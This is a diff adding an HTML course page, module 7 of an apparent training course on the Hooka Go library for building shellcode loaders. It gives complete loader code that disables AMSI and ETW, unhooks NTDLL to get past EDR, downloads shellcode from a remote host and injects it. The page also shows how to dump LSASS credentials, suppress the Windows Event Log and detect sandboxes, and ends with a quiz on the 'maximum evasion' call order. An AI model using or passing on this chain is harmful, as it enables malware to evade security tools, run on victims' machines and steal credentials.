@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 7: The Hooka Go Library - Hooka Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1FA9D;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#4ade80;--accent2:#2dd4bf;--gradient:linear-gradient(135deg,#4ade80,#2dd4bf)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Hooka Course</h2>
+<span>Shellcode Loader Generator</span>
+</div>
+<a class="home-link" href="../Hooka_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Introduction to Shellcode Loaders</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Injection Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Syscalls &amp; Gate Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Unhooking &amp; Patching</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Sandbox Detection &amp; Process Protection</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Encryption &amp; Obfuscation</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module7.html"><span>7. The Hooka Go Library</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. CLI Generator &amp; Full Chain</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 7: The Hooka Go Library</h1>
+<p class="subtitle">Import <code>pkg/hooka</code> directly into your own Go projects &mdash; 40+ exported functions across 16 source files for full programmatic control.</p>
+
+<div class="card highlight">
+<h4>Why Use the Library Directly?</h4>
+<p>The Hooka CLI generates complete loaders from flags, but sometimes you need <strong>fine-grained control</strong> that a CLI cannot provide. The Go library (<code>github.com/D3Ext/Hooka/pkg/hooka</code>) exposes every individual function &mdash; injection methods, syscall resolution, unhooking, patching, sandbox detection, and more &mdash; as importable, composable building blocks. You can combine them in custom sequences, add your own logic between steps, integrate with other Go tooling, and build entirely novel loader architectures.</p>
+</div>
+
+<!-- ==================== SECTION 1: Installation ==================== -->
+<h2>Installation</h2>
+<pre><span class="lang-tag">Bash</span># Add the Hooka library to your Go module
+go get github.com/D3Ext/Hooka/pkg/hooka</pre>
+
+<div class="card">
+<h4>Import in Your Code</h4>
+<pre><span class="lang-tag">Go</span>import "github.com/D3Ext/Hooka/pkg/hooka"</pre>
+<p>All exported functions are accessed via the <code>hooka.</code> prefix. The package has no global state and each function is self-contained, making it safe to call in any order (though certain sequences are recommended for maximum evasion).</p>
+</div>
+
+<!-- ==================== SECTION 2: Source File Breakdown ==================== -->
+<h2>Package Structure: 16 Source Files</h2>
+<p>The <code>pkg/hooka</code> package is organized by functionality. Each source file handles a distinct category of operations:</p>
+
+<table>
+<tr><th>File</th><th>Category</th><th>Key Functions</th></tr>
+<tr><td><code>acg.go</code></td><td>ACG Guard</td><td><code>EnableACG()</code></td></tr>
+<tr><td><code>amsi.go</code></td><td>AMSI Patching</td><td><code>PatchAmsi()</code>, <code>PatchAmsiRaw()</code></td></tr>
+<tr><td><code>auxiliary.go</code></td><td>Shellcode I/O</td><td><code>GetShellcodeFromFile()</code>, <code>GetShellcodeFromUrl()</code>, <code>WriteShellcodeToFile()</code></td></tr>
+<tr><td><code>blockdlls.go</code></td><td>DLL Blocking</td><td><code>BlockDLLs()</code>, <code>CreateProcessBlockDLLs()</code></td></tr>
+<tr><td><code>dll.go</code></td><td>sRDI Conversion</td><td><code>ConvertDllToShellcode()</code>, <code>ConvertDllBytesToShellcode()</code></td></tr>
+<tr><td><code>etw.go</code></td><td>ETW Patching</td><td><code>PatchEtw()</code>, <code>PatchEtwRaw()</code></td></tr>
+<tr><td><code>gate.go</code></td><td>Halo's Gate</td><td><code>GetSysIdHashHalos()</code></td></tr>
+<tr><td><code>hashing.go</code></td><td>API Hashing</td><td><code>Md5()</code>, <code>Sha1()</code>, <code>Sha256()</code>, <code>GetFuncHashValue()</code></td></tr>
+<tr><td><code>hooks.go</code></td><td>Hook Detection</td><td><code>DetectHooks()</code>, <code>DetectHooksInDll()</code></td></tr>
+<tr><td><code>lsass.go</code></td><td>Credential Dumping</td><td><code>DumpLsass()</code>, <code>CheckHighPrivs()</code></td></tr>
+<tr><td><code>phant0m.go</code></td><td>Event Log Suppression</td><td><code>GetEventLogPid()</code>, <code>Phant0m()</code></td></tr>
+<tr><td><code>sandbox.go</code></td><td>Sandbox Detection</td><td><code>CheckMemory()</code>, <code>CheckDisk()</code>, <code>CheckCpu()</code>, <code>CheckHostname()</code>, <code>CheckUsername()</code>, <code>CheckDrivers()</code>, <code>CheckProcess()</code>, <code>CheckInternet()</code>, <code>AutoCheck()</code></td></tr>
+<tr><td><code>shellcode.go</code></td><td>Injection Methods</td><td><code>SuspendedProcess()</code>, <code>ProcessHollowing()</code>, <code>NtCreateThreadEx()</code>, <code>EnumCalcProc()</code>, <code>CreateFiber()</code>, <code>QueueUserApc()</code>, etc.</td></tr>
+<tr><td><code>sleep.go</code></td><td>Custom Sleep</td><td><code>Sleep()</code></td></tr>
+<tr><td><code>syscall.go</code></td><td>Raw Syscalls</td><td><code>Syscall()</code>, <code>PrepareSyscall()</code></td></tr>
+<tr><td><code>unhook.go</code></td><td>Unhooking</td><td><code>ClassicUnhook()</code>, <code>FullUnhook()</code>, <code>PerunsUnhook()</code></td></tr>
+</table>
+
+<!-- ==================== SECTION 3: Building a Custom Loader ==================== -->
+<h2>Building a Custom Loader Step by Step</h2>
+<p>The following sequence mirrors the pattern recommended by D3Ext for building a robust custom loader using the library. Each step builds on the previous, creating a layered evasion chain.</p>
+
+<h3>Step 1: Import the Package</h3>
+<pre><span class="lang-tag">Go</span>package main
+
+import (
+    "fmt"
+    "os"
+    "github.com/D3Ext/Hooka/pkg/hooka"
+)</pre>
+
+<h3>Step 2: Patch AMSI</h3>
+<div class="card">
+<h4>Disable Antimalware Scan Interface</h4>
+<pre><span class="lang-tag">Go</span>err := hooka.PatchAmsi()
+if err != nil {
+    fmt.Println("[!] AMSI patch failed:", err)
+    os.Exit(1)
+}</pre>
+<p>This must happen <strong>before</strong> loading any shellcode into memory. AMSI scans buffers passed to <code>AmsiScanBuffer</code> &mdash; if not patched, the shellcode will be scanned during injection.</p>
+</div>
+
+<h3>Step 3: Patch ETW</h3>
+<div class="card">
+<h4>Disable Event Tracing for Windows</h4>
+<pre><span class="lang-tag">Go</span>err = hooka.PatchEtw()
+if err != nil {
+    fmt.Println("[!] ETW patch failed:", err)
+    os.Exit(1)
+}</pre>
+<p>ETW feeds telemetry to EDR products. Patching it reduces the visibility of subsequent operations to monitoring tools.</p>
+</div>
+
+<h3>Step 4: Unhook NTDLL</h3>
+<div class="card">
+<h4>Remove EDR Hooks</h4>
+<pre><span class="lang-tag">Go</span>err = hooka.PerunsUnhook()
+if err != nil {
+    fmt.Println("[!] Unhook failed:", err)
+    os.Exit(1)
+}</pre>
+<p><code>PerunsUnhook()</code> (Perun's Fart) replaces the hooked .text section of ntdll.dll with a clean copy. After this call, all subsequent NTDLL function calls bypass EDR hooks. You could also use <code>ClassicUnhook()</code> or <code>FullUnhook()</code> depending on your needs.</p>
+</div>
+
+<h3>Step 5: Get Shellcode</h3>
+<div class="card">
+<h4>Load from File or URL</h4>
+<pre><span class="lang-tag">Go</span>// From a local file:
+shellcode, err := hooka.GetShellcodeFromFile("/path/to/shellcode.bin")
+
+// OR from a remote URL:
+shellcode, err := hooka.GetShellcodeFromUrl("http://192.168.1.100/sc.bin")</pre>
+<p>Both functions return a <code>[]byte</code> slice containing the raw shellcode.</p>
+</div>
+
+<h3>Step 6: Decrypt Shellcode</h3>
+<div class="card">
+<h4>Using maldev Crypto Functions</h4>
+<pre><span class="lang-tag">Go</span>import "github.com/D3Ext/maldev/crypto"
+
+// If shellcode was AES-encrypted at build time:
+decrypted, err := crypto.AesDecrypt(shellcode, key)</pre>
+<p>The maldev library provides <code>AesDecrypt</code>, <code>XorEncrypt</code> (XOR is its own inverse), <code>Rc4Encrypt</code>, <code>ChaCha20Encrypt</code>, and other cryptographic functions for decryption.</p>
+</div>
+
+<h3>Step 7: Resolve Syscalls via Halo's Gate</h3>
+<div class="card">
+<h4>Get System Service Numbers</h4>
+<pre><span class="lang-tag">Go</span>// Resolve the SSN for NtCreateThreadEx using Halo's Gate
+// Uses API hashing to avoid plain-text function name strings
+ntCreateThreadExHash := hooka.GetFuncHashValue("NtCreateThreadEx")
+sysId, err := hooka.GetSysIdHashHalos(ntCreateThreadExHash, hooka.Sha1)</pre>
+<p><code>GetSysIdHashHalos()</code> walks the NTDLL export table using Halo's Gate algorithm to find the System Service Number (SSN) for the target function. The hash-based lookup avoids having the function name as a string in the binary.</p>
+</div>
+
+<h3>Step 8: Inject</h3>
+<div class="card green">
+<h4>Execute the Shellcode</h4>
+<pre><span class="lang-tag">Go</span>// Inject using NtCreateThreadEx with Halo's Gate syscalls
+err = hooka.NtCreateThreadExHalos(decrypted)
+if err != nil {
+    fmt.Println("[!] Injection failed:", err)
+    os.Exit(1)
+}</pre>
+<p>The <code>NtCreateThreadExHalos()</code> function combines NtCreateThreadEx injection with Halo's Gate syscall resolution in a single call. Alternatively, you can use any other injection method from <code>shellcode.go</code>.</p>
+</div>
+
+<!-- ==================== SECTION 4: Complete Example ==================== -->
+<h2>Complete Custom Loader</h2>
+<pre><span class="lang-tag">Go</span>package main
+
+import (
+    "fmt"
+    "os"
+    "github.com/D3Ext/Hooka/pkg/hooka"
+)
+
+func main() {
+    // 1. Patch AMSI
+    if err := hooka.PatchAmsi(); err != nil {
+        os.Exit(1)
+    }
+
+    // 2. Patch ETW
+    if err := hooka.PatchEtw(); err != nil {
+        os.Exit(1)
+    }
+
+    // 3. Unhook NTDLL (Perun's Fart)
+    if err := hooka.PerunsUnhook(); err != nil {
+        os.Exit(1)
+    }
+
+    // 4. Load shellcode from URL
+    sc, err := hooka.GetShellcodeFromUrl("http://192.168.1.100/sc.bin")
+    if err != nil {
+        os.Exit(1)
+    }
+
+    // 5. Inject via NtCreateThreadEx + Halo's Gate
+    if err := hooka.NtCreateThreadExHalos(sc); err != nil {
+        fmt.Println("[!] Injection failed:", err)
+        os.Exit(1)
+    }
+}</pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Custom Loader Execution Flow</h4>
+<div class="flow">
+<div class="box">PatchAmsi<br><small>Disable AMSI</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">PatchEtw<br><small>Disable ETW</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">PerunsUnhook<br><small>Clean NTDLL</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">GetShellcode<br><small>File or URL</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Decrypt<br><small>AES/XOR/etc</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Inject<br><small>NtCreateThreadEx</small></div>
+</div>
+</div>
+
+<!-- ==================== SECTION 5: sRDI DLL Conversion ==================== -->
+<h2>sRDI: DLL-to-Shellcode Conversion</h2>
+<p>sRDI (shellcode Reflective DLL Injection) converts a standard DLL into position-independent shellcode that loads itself. Hooka provides two functions for this:</p>
+
+<div class="card">
+<h4>ConvertDllToShellcode()</h4>
+<pre><span class="lang-tag">Go</span>// Convert a DLL file on disk to shellcode
+shellcode, err := hooka.ConvertDllToShellcode(
+    "payload.dll",     // path to DLL file
+    "DllMain",         // exported function to call
+    "",                // optional function arguments
+)</pre>
+<p>This reads the DLL from disk, prepends a reflective loader stub, and returns shellcode that, when executed, maps the DLL into memory and calls the specified export function.</p>
+</div>
+
+<div class="card">
+<h4>ConvertDllBytesToShellcode()</h4>
+<pre><span class="lang-tag">Go</span>// Convert DLL bytes already in memory to shellcode
+dllBytes, _ := os.ReadFile("payload.dll")
+shellcode, err := hooka.ConvertDllBytesToShellcode(
+    dllBytes,          // DLL as byte slice
+    "DllMain",         // exported function to call
+    "",                // optional function arguments
+)</pre>
+<p>Same as above but works with DLL bytes already loaded into memory. Useful when the DLL is fetched from a remote source or decrypted at runtime.</p>
+</div>
+
+<!-- ==================== SECTION 6: Credential Operations ==================== -->
+<h2>Credential Operations</h2>
+<p>The library includes functions for privilege checking and credential dumping:</p>
+
+<div class="card">
+<h4>Privilege Check &amp; LSASS Dump</h4>
+<pre><span class="lang-tag">Go</span>// Check if running with high privileges (admin/SYSTEM)
+isAdmin, err := hooka.CheckHighPrivs()
+if isAdmin {
+    // Dump LSASS process memory to file
+    err = hooka.DumpLsass("lsass.dmp")
+}</pre>
+<p><code>CheckHighPrivs()</code> verifies whether the current process has administrative or SYSTEM privileges. <code>DumpLsass(output)</code> creates a minidump of the LSASS process, which contains cached credentials. The output file can be processed offline with tools like Mimikatz or pypykatz.</p>
+</div>
+
+<!-- ==================== SECTION 7: Complete API Reference ==================== -->
+<h2>Complete API Reference</h2>
+<p>All exported functions grouped by category:</p>
+
+<h3>Injection Methods</h3>
+<table>
+<tr><th>Function</th><th>Technique</th></tr>
+<tr><td><code>SuspendedProcess(sc, proc)</code></td><td>Early Bird injection into a suspended process</td></tr>
+<tr><td><code>ProcessHollowing(sc, proc)</code></td><td>Hollow target process and replace with shellcode</td></tr>
+<tr><td><code>NtCreateThreadEx(sc)</code></td><td>Create remote thread via NtCreateThreadEx</td></tr>
+<tr><td><code>NtCreateThreadExHalos(sc)</code></td><td>NtCreateThreadEx with Halo's Gate syscalls</td></tr>
+<tr><td><code>EnumCalcProc(sc)</code></td><td>Callback injection via EnumChildWindows</td></tr>
+<tr><td><code>CreateFiber(sc)</code></td><td>Fiber-based shellcode execution</td></tr>
+<tr><td><code>QueueUserApc(sc, proc)</code></td><td>APC injection into target process</td></tr>
+<tr><td><code>CreateRemoteThread(sc, pid)</code></td><td>Classic remote thread injection</td></tr>
+<tr><td><code>CreateRemoteThreadHalos(sc, pid)</code></td><td>Remote thread with Halo's Gate</td></tr>
+<tr><td><code>NoRwx(sc)</code></td><td>No-RWX shellcode execution</td></tr>
+</table>
+
+<h3>Defense Evasion</h3>
+<table>
+<tr><th>Function</th><th>Purpose</th></tr>
+<tr><td><code>PatchAmsi()</code></td><td>Patch AMSI (method 1)</td></tr>
+<tr><td><code>PatchAmsiRaw()</code></td><td>Patch AMSI (method 2 &mdash; raw bytes)</td></tr>
+<tr><td><code>PatchEtw()</code></td><td>Patch ETW (method 1)</td></tr>
+<tr><td><code>PatchEtwRaw()</code></td><td>Patch ETW (method 2 &mdash; raw bytes)</td></tr>
+<tr><td><code>ClassicUnhook()</code></td><td>Classic NTDLL unhooking</td></tr>
+<tr><td><code>FullUnhook()</code></td><td>Full DLL unhooking</td></tr>
+<tr><td><code>PerunsUnhook()</code></td><td>Perun's Fart unhooking</td></tr>
+<tr><td><code>EnableACG()</code></td><td>Enable Arbitrary Code Guard</td></tr>
+<tr><td><code>BlockDLLs()</code></td><td>Block non-Microsoft DLLs (self)</td></tr>
+<tr><td><code>CreateProcessBlockDLLs(cmd)</code></td><td>Spawn process with DLL blocking</td></tr>
+</table>
+
+<h3>Sandbox Detection</h3>
+<table>
+<tr><th>Function</th><th>What It Checks</th></tr>
+<tr><td><code>CheckMemory()</code></td><td>RAM &lt; 4 GB</td></tr>
+<tr><td><code>CheckDisk()</code></td><td>Disk &lt; 100 GB</td></tr>
+<tr><td><code>CheckCpu()</code></td><td>CPU &lt; 2 cores</td></tr>
+<tr><td><code>CheckHostname()</code></td><td>Known sandbox hostnames</td></tr>
+<tr><td><code>CheckUsername()</code></td><td>Known sandbox usernames</td></tr>
+<tr><td><code>CheckDrivers()</code></td><td>VM drivers (VMware, VBox, Hyper-V)</td></tr>
+<tr><td><code>CheckProcess()</code></td><td>Analysis tools running</td></tr>
+<tr><td><code>CheckInternet()</code></td><td>Internet connectivity</td></tr>
+<tr><td><code>AutoCheck()</code></td><td>All checks combined</td></tr>
+</table>
+
+<h3>Utility Functions</h3>
+<table>
+<tr><th>Function</th><th>Purpose</th></tr>
+<tr><td><code>GetShellcodeFromFile(path)</code></td><td>Read shellcode from local file</td></tr>
+<tr><td><code>GetShellcodeFromUrl(url)</code></td><td>Fetch shellcode from remote URL</td></tr>
+<tr><td><code>WriteShellcodeToFile(sc, path)</code></td><td>Write shellcode bytes to file</td></tr>
+<tr><td><code>ConvertDllToShellcode(dll, func, args)</code></td><td>Convert DLL file to shellcode (sRDI)</td></tr>
+<tr><td><code>ConvertDllBytesToShellcode(bytes, func, args)</code></td><td>Convert DLL bytes to shellcode</td></tr>
+<tr><td><code>DetectHooks()</code></td><td>Detect EDR hooks in NTDLL</td></tr>
+<tr><td><code>DetectHooksInDll(dll)</code></td><td>Detect hooks in any DLL</td></tr>
+<tr><td><code>GetSysIdHashHalos(hash, hashFunc)</code></td><td>Resolve SSN via Halo's Gate</td></tr>
+<tr><td><code>GetFuncHashValue(name)</code></td><td>Compute API hash for function name</td></tr>
+<tr><td><code>CheckHighPrivs()</code></td><td>Check for admin/SYSTEM privileges</td></tr>
+<tr><td><code>DumpLsass(output)</code></td><td>Dump LSASS process memory</td></tr>
+<tr><td><code>GetEventLogPid()</code></td><td>Find Event Log service PID</td></tr>
+<tr><td><code>Phant0m(pid)</code></td><td>Suspend Event Log threads</td></tr>
+<tr><td><code>Sleep()</code></td><td>Custom sleep for timing evasion</td></tr>
+</table>
+
+<!-- ==================== SECTION 8: Combining with maldev ==================== -->
+<h2>Combining with the maldev Library</h2>
+<div class="card">
+<h4>Advanced Encryption Chains</h4>
+<p>The maldev library (<code>github.com/D3Ext/maldev</code>) provides additional cryptographic functions that complement Hooka's library. You can build multi-layer encryption chains:</p>
+<pre><span class="lang-tag">Go</span>import (
+    "github.com/D3Ext/Hooka/pkg/hooka"
+    "github.com/D3Ext/maldev/crypto"
+    "github.com/D3Ext/maldev/encoding"
+)
+
+// Multi-layer decryption: Base64 decode -&gt; ChaCha20 decrypt -&gt; XOR decode
+encoded := getPayloadFromUrl()
+decoded, _ := encoding.Base64Decode(encoded)
+decrypted, _ := crypto.ChaCha20Decrypt(decoded, chachaKey, nonce)
+shellcode, _ := crypto.XorEncrypt(decrypted, xorKey)  // XOR is its own inverse
+
+// Then inject with Hooka
+hooka.NtCreateThreadExHalos(shellcode)</pre>
+</div>
+
+<!-- ==================== SECTION 9: Library vs CLI ==================== -->
+<h2>When to Use Library vs CLI</h2>
+
+<div class="versus">
+<table>
+<tr><th>Factor</th><th>CLI (<code>hooka</code>)</th><th>Library (<code>pkg/hooka</code>)</th></tr>
+<tr><td>Speed</td><td>Fast &mdash; one command generates a complete loader</td><td>Slower &mdash; requires writing Go code</td></tr>
+<tr><td>Customization</td><td>Limited to available flags</td><td>Full control over every step</td></tr>
+<tr><td>Custom logic</td><td>Not possible</td><td>Add conditional checks, custom crypto, networking</td></tr>
+<tr><td>Encryption options</td><td>AES, 3DES, RC4, XOR</td><td>Any algorithm (via maldev or custom code)</td></tr>
+<tr><td>Injection chaining</td><td>Single technique per loader</td><td>Multiple techniques in sequence or based on conditions</td></tr>
+<tr><td>Error handling</td><td>Generic exit on failure</td><td>Custom error handling and fallback strategies</td></tr>
+<tr><td>Best for</td><td>Quick loader generation, testing, standard scenarios</td><td>Advanced tooling, custom C2, novel techniques</td></tr>
+</table>
+</div>
+
+<!-- ==================== QUIZ ==================== -->
+<div class="quiz" id="quiz7">
+<h4>Module 7 Quiz: The Hooka Go Library</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: What is the recommended order for the first three calls in a custom loader?</p>
+<label data-opt="0"><input type="radio" name="q7_0"> GetShellcode &rarr; PatchAmsi &rarr; Inject</label>
+<label data-opt="1"><input type="radio" name="q7_0"> PerunsUnhook &rarr; PatchAmsi &rarr; PatchEtw</label>
+<label data-opt="2"><input type="radio" name="q7_0"> PatchAmsi &rarr; PatchEtw &rarr; PerunsUnhook</label>
+<label data-opt="3"><input type="radio" name="q7_0"> NtCreateThreadEx &rarr; PatchAmsi &rarr; GetShellcode</label>
+<div class="explain">The correct order is: PatchAmsi() first (to prevent AMSI from scanning subsequent operations), PatchEtw() second (to stop ETW telemetry), then PerunsUnhook() (to clean NTDLL of EDR hooks). This ensures maximum evasion before any shellcode loading or injection occurs.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: What does ConvertDllToShellcode() produce?</p>
+<label data-opt="0"><input type="radio" name="q7_1"> A compressed version of the DLL</label>
+<label data-opt="1"><input type="radio" name="q7_1"> Position-independent shellcode with a reflective loader stub that maps the DLL into memory and calls the specified export</label>
+<label data-opt="2"><input type="radio" name="q7_1"> A new DLL with a different entry point</label>
+<label data-opt="3"><input type="radio" name="q7_1"> An executable wrapper around the DLL</label>
+<div class="explain">sRDI (shellcode Reflective DLL Injection) prepends a reflective loader stub to the DLL, producing position-independent shellcode. When this shellcode executes, it maps the DLL into the current process's memory (handling relocations, imports, etc.) and calls the specified exported function.</div>
+</div>
+<div class="quiz-q" data-correct="3">
+<p>Q3: What is the primary advantage of using the Go library over the CLI?</p>
+<label data-opt="0"><input type="radio" name="q7_2"> The library is faster at runtime</label>
+<label data-opt="1"><input type="radio" name="q7_2"> The library has more injection techniques</label>
+<label data-opt="2"><input type="radio" name="q7_2"> The library produces smaller binaries</label>
+<label data-opt="3"><input type="radio" name="q7_2"> Full programmatic control: custom logic, conditional execution paths, multi-layer encryption, and integration with other Go tooling</label>
+<div class="explain">The library and CLI use the same underlying functions and injection techniques. The key advantage of the library is full programmatic control: you can add conditional checks, implement custom encryption chains, integrate with C2 frameworks, create fallback strategies, and compose functions in ways the CLI flags cannot express.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz7')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module6.html">&larr; Prev: Encryption &amp; Obfuscation</a>
+<a class="primary" href="module8.html">Next: CLI Generator &amp; Full Chain &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
